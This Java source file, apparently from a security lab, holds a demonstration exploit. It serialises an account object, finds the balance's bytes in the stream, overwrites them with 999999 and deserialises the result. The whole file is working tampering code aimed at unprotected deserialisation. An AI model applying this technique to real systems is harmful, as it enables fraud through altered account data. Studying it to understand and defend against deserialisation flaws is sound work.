import java.io.*;

/**
 * EXPLOIT: SerializeExploit
 * Manually manipulates the Java serialization byte stream to modify private
 * fields.
 */
public class SerializeExploit {

    public static byte[] tamper(SensitiveAccount account) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(account);
        oos.close();

        byte[] stream = baos.toByteArray();

        // --- Tampering Logic ---
        // Java serialization format for an int field named 'balance' with value 100
        // (0x64):
        // We look for the value 100 and change it to 999999 (0x0F423F).
        // This is a simplified lab exploit; real stream tampering is more complex.

        int originalValue = account.getBalance();
        int newValue = 999999;

        // Find the 4-byte integer in the stream (Big Endian)
        for (int i = 0; i < stream.length - 4; i++) {
            if (stream[i] == (byte) ((originalValue >> 24) & 0xFF) &&
                    stream[i + 1] == (byte) ((originalValue >> 16) & 0xFF) &&
                    stream[i + 2] == (byte) ((originalValue >> 8) & 0xFF) &&
                    stream[i + 3] == (byte) (originalValue & 0xFF)) {

                System.out.println("Exploit: Found balance value at offset " + i + ". Injecting new value...");
                stream[i] = (byte) ((newValue >> 24) & 0xFF);
                stream[i + 1] = (byte) ((newValue >> 16) & 0xFF);
                stream[i + 2] = (byte) ((newValue >> 8) & 0xFF);
                stream[i + 3] = (byte) (newValue & 0xFF);
                break;
            }
        }

        return stream;
    }

    public static SensitiveAccount deserialize(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);
        return (SensitiveAccount) ois.readObject();
    }
}
